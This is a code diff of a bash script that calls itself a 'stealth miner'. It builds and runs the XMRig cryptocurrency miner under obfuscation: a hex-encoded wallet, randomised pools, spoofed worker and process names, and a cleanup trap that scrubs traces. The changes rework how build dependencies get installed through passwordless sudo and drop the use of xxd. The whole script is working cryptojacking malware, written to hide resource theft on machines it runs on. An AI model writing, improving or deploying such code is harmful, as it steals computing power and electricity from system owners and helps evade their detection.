@@ -1,11 +1,11 @@
 #!/bin/bash
 # ================================================================
 #  PURE BASH STEALTH MINER – NO xxd, NO FAKE TEXT, FULL RANDOM
-#  (All spoofs are random alphanumeric strings)
+#  (Handles sudo without password, all spoofs random)
 # ================================================================
 set -e
 
-# ---- Pure Bash hex decoder (no xxd) ----
+# ---- Pure Bash hex decoder (no external tools) ----
 _HX() {
     local hex="$1"
     local bytes=""
@@ -15,7 +15,7 @@ _HX() {
     printf "$bytes"
 }
 
-# ---- Random generators ----
+# ---- Random generators (no xxd) ----
 _RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
 _RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
 _RAND_CPU() { echo $((50 + RANDOM % 41)); }
@@ -23,7 +23,7 @@ _RAND_CPU() { echo $((50 + RANDOM % 41)); }
 # ---- Core config (hex obfuscated) ----
 _WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")
 
-# ---- Random pool from a list (still obfuscated) ----
+# ---- Random pool from a list ----
 _POOLS=(
     "stratum+tcp://zeph.2miners.com:2222"
     "stratum+tcp://zephyrpool.com:5555"
@@ -36,10 +36,8 @@ _POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}
 _CPULIM=$(_RAND_CPU)
 _PRINT_TIME=$((30 + RANDOM % 91))
 
-# ---- ALL SPOOFS ARE PURE RANDOM (no lists) ----
-# Worker base: random 4-hex chars
-_WBASE=$(head -c 4 /dev/urandom | xxd -p | head -c 4)   # xxd here only for short random hex, we can replace with od if needed but xxd is still used for short random; we can use od -An -tx1 -N2 /dev/urandom | tr -d ' ' instead. Let's change to avoid xxd entirely.
-# Replace xxd with od:
+# ---- ALL SPOOFS ARE PURE RANDOM (no xxd) ----
+# Worker base: 4 random hex chars using od
 _WBASE=$(od -An -tx2 -N2 /dev/urandom | tr -d ' ')
 _SUFFIX=$(od -An -tx2 -N6 /dev/urandom | tr -d ' ' | head -c 6)
 _WORKER="${_WBASE}-${_SUFFIX}"
@@ -75,12 +73,24 @@ _scrub() {
 }
 trap '_scrub ; exit' EXIT
 
-# ---- Install deps (hex encoded) ----
-if command -v $(_HX "6170742d676574") &>/dev/null; then
-    eval "$(_HX "7375646f206170742d67657420757064617465202d7171202626207375646f206170742d67657420696e7374616c6c202d79202d7171206275696c642d657373656e7469616c20636d616b65206c69627576312d646576206c696273736c2d646576206c696268776c6f632d6465762077637574206375726c")"
-elif command -v $(_HX "796d") &>/dev/null; then
-    eval "$(_HX "7375646f20796d20696e7374616c6c202d79202d7120676363206763632d632b2b20636d616b65206c696275762d646576206f70656e73736c2d6465762068776c6f632d6465762077637574206375726c")"
-fi
+# ---- Install dependencies only if missing and passwordless sudo available ----
+_install_deps() {
+    if ! command -v cmake &>/dev/null || ! command -v gcc &>/dev/null; then
+        if sudo -n true 2>/dev/null; then
+            echo "Installing dependencies (passwordless sudo)..."
+            if command -v apt-get &>/dev/null; then
+                sudo apt-get update -qq
+                sudo apt-get install -y -qq build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget curl
+            elif command -v yum &>/dev/null; then
+                sudo yum install -y -q gcc gcc-c++ cmake libuv-devel openssl-devel hwloc-devel wget curl
+            fi
+        else
+            echo "⚠️ Sudo requires password or is unavailable. Skipping dependency installation."
+            echo "   Ensure build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev are installed."
+        fi
+    fi
+}
+_install_deps
 
 # ---- Compile XMRig (background) ----
 _SCR=$(cd "$(dirname "$0")" && pwd)
@@ -111,7 +121,6 @@ printf '{
 }\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"
 
 # ---- Launch miner with random process spoof ----
-# Watchdog keywords (hex)
 _BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
 _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
 
